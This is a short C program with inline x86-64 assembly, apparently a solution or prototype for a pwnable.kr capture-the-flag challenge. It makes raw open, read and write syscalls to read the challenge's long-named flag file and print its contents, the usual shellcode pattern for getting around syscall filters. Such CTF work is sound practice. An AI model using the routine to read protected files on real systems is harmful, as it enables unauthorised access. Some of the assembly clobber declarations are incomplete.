#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>


int main() {
  char* name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";

  long long fd;
  __asm__ volatile (
      "movq %1, %%rax\n"
      "movq %2, %%rdi\n"
      "movq %3, %%rsi\n"
      "syscall\n"
      "movq %%rax, %0"
      : "=r" (fd)
      : "r" ((long long)__NR_open), 
        "r" (name),
        "r" ((long long)O_RDONLY)
      : "rax");
  char buf[101];
  long long len;
  __asm__ volatile (
      "movq %1, %%rax\n"
      "movq %2, %%rdi\n"
      "movq %3, %%rsi\n"
      "movq %4, %%rdx\n"
      "syscall\n"
      "movq %%rax, %0"
      : "=r" (len)
      : "r" ((long long)__NR_read), 
        "r" (fd),
        "r" (buf),
        "r" (100L)
      : "rax", "rdi");
  __asm__ volatile (
      "movq %0, %%rax\n"
      "movq %1, %%rdi\n"
      "movq %2, %%rsi\n"
      "movq %3, %%rdx\n"
      "syscall\n"
      :
      : "r" ((long long)__NR_write), 
        "r" (1L),
        "r" (buf),
        "r" (len)
      : "rax", "rdi");
  __asm__ volatile (
      "movq %0, %%rax\n"
      "syscall\n"
      :: "r" ((long long)__NR_exit));
}

